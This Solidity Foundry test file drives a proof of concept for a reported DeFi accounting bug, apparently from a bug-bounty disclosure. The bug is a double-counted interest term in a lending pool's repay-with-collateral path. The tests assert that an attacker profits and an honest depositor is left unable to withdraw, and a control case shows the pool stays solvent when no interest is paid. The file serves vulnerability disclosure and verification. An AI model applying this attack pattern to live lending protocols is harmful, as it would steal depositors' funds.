// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./61090-incorrect-updates-to-pooldepositdatatotalamount-and-loancoll.sol";

/*//////////////////////////////////////////////////////////////////////////
    Driver for Folks Finance finding #61090 — incorrect updates to
    pool.depositData.totalAmount during repay-with-collateral.

    Fully local: no fork, no RPC, no cheatcodes. `forge test -vvv`.

    - test_exploit(): runs the synthetic Exploit end-to-end and re-asserts the
      HARM (inflated accounting, attacker steals the double-counted interest,
      honest depositor Carol left with a real token deficit).
    - test_repayWithoutInterest_isSolvent(): control — the SAME scenario with
      interestPaid = 0 (the bug's `- interestPaid` term is a no-op), showing the
      pool stays solvent and every depositor is made whole. Proves the interest
      term is exactly what breaks the accounting.
//////////////////////////////////////////////////////////////////////////*/
contract Folks61090Test is Test {
    /// @notice The attack: repay-with-collateral inflates deposit accounting,
    ///         the attacker extracts the double-counted interest, and the honest
    ///         co-depositor cannot be made whole.
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        MockUSDC token = e.token();
        HubPool pool = e.pool();
        HonestDepositor carol = e.carol();

        // HARM 1 — accounting invariant broken by exactly the interest (60).
        // The value is captured inside run() right after the buggy repay.
        assertEq(e.accountingGapAfterRepay(), 60, "invariant gap should equal double-counted interest");

        // HARM 2 — theft of unclaimed yield: attacker profited exactly 60 base
        // tokens (surfaced as an ERC20 balance on the Exploit orchestrator).
        assertEq(e.attackerStartBalance(), 1000, "attacker start capital");
        assertEq(e.attackerEndBalance(), 1060, "attacker end balance");
        assertGt(e.attackerEndBalance(), e.attackerStartBalance(), "attacker must profit");
        assertEq(e.attackerEndBalance() - e.attackerStartBalance(), 60, "attacker profit == stolen interest");

        // HARM 3 — honest depositor Carol left with a real token deficit: her
        // shares are booked as worth 100, but only 40 tokens remain to pay her.
        assertEq(e.carolClaim(), 100, "carol accounted claim");
        assertEq(e.poolBalanceAtCarolRedeem(), 40, "pool balance available to carol");
        assertLt(e.poolBalanceAtCarolRedeem(), e.carolClaim(), "pool cannot make carol whole");
        assertEq(e.carolClaim() - e.poolBalanceAtCarolRedeem(), 60, "carol shortfall == double-counted interest");

        // Carol deposited 100 of real liquidity but can never redeem it in full:
        // a full redeem reverts (the pool is out of tokens) — funds are locked.
        uint256 carolShares = pool.shares(address(carol));
        vm.expectRevert(); // ERC20 transfer underflow: pool holds 40, owes 100
        carol.redeemAll();

        // and the pool is unambiguously insolvent for the remaining claims
        assertLt(token.balanceOf(address(pool)), pool.sharesToUnderlying(carolShares), "pool insolvent for carol");
    }

    /// @notice Control: identical flow but with interestPaid = 0, so the buggy
    ///         `- interestPaid` term contributes nothing. The pool stays exactly
    ///         solvent and both depositors are made whole.
    function test_repayWithoutInterest_isSolvent() public {
        MockUSDC token = new MockUSDC();
        HubPool pool = new HubPool(token);
        HonestDepositor carol = new HonestDepositor(token, pool);

        // attacker (this test) deposits 1000, borrows 900
        token.mint(address(this), 1000);
        token.approve(address(pool), 1000);
        pool.deposit(1000);
        pool.borrowVariable(900);

        // NO interest accrues; repay principal only with collateral
        pool.repayWithCollateral(900, 0, 0);

        // accounting is correct: totalDeposited - totalBorrowed == pool balance
        uint256 totalDep = pool.totalDeposited();
        uint256 totalBor = pool.totalBorrowed();
        uint256 poolBal = token.balanceOf(address(pool));
        assertEq(totalDep, 100, "correct totalDeposited");
        assertEq(totalBor, 0, "borrow cleared");
        assertEq(poolBal, 100, "pool balance");
        assertEq(totalDep - totalBor, poolBal, "pool exactly solvent (no inflation)");

        // Carol deposits and every depositor can redeem in full
        carol.deposit(100);
        assertEq(pool.shares(address(carol)), 100, "carol shares priced fairly (index 1)");

        // attacker redeems leftover shares: exactly break-even (no stolen yield)
        uint256 attackerShares = pool.shares(address(this));
        assertEq(attackerShares, 100, "attacker leftover shares");
        uint256 before = token.balanceOf(address(this));
        pool.redeem(attackerShares);
        assertEq(token.balanceOf(address(this)) - before, 100, "attacker redeems exactly fair value");

        // Carol is made whole: gets her full 100 back
        uint256 carolBefore = token.balanceOf(address(carol));
        carol.redeemAll();
        assertEq(token.balanceOf(address(carol)) - carolBefore, 100, "carol made whole");
    }
}
